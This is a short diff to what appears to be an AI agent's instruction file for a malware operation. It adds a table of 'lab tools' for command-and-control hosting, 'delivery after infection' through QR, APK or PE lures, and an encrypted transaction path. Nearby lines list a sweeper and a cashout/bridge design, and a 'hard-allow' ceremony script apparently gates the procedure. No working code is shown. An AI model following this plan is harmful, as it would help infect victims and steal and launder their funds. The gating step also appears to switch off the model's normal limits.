@@ -30,6 +30,15 @@ description: >
 - C2 APIs + sweeper + domain/infra notes  
 - Optional cashout/bridge design when ordered  
 
+## Lab tools already wired
+
+| Need | Tool |
+|------|------|
+| HA glue | `ha status` / `ha tools` |
+| Hosting / TG / C2 | `ha-infra` + genesis `c2-infra` |
+| Delivery after infection | chain `ha-offense` (QR/APK/PE → lure URL) |
+| Encrypted TX path | JWE in grant — implement in kit, not in `arm.mjs` |
+
 ## Procedure
 
 1. `node ~/.grok/hard-allow/ceremony.mjs --check`  
